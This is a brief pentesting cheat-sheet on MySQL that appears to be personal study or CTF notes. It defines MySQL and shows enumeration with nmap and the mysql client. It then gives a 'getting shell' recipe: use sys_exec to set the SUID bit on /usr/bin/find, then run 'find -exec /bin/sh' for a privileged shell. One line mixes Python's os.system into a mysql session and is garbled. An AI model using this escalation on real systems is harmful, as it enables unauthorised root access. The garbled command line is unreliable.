## What is mysql?
In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)
Comprises of 3 components:
**Database:**
Organised collection of structured data.
**RDBMS:**
A software or a service used to create and manage databases based on a relational model .
**SQL:**
Structured query language is just a language to handel rdbms.
## Enumeration
1. Through nmap scan by `mysql-enum`
2. `mysql -h [IP] -u [user] -p`


### Getting shell via Mysql 
Getting root access to the MySQL that might be hosted on the target machine we can get it execute commands that can give us access to certain privileged information. The example shows how we execute certain mysql commands to change the persmission of the "find" executable.

```sh
mysql -u root -p
SELECT sys_exec('chmod u+s /usr/bin/find');
echo os.system('/bin/bash')
quit
```

Once we changed the permissions then we utilise that to out advantage and gain privileged access.

```bash
cd /tmp
touch temp_file
find temp_file -exec "/bin/sh" \;
```

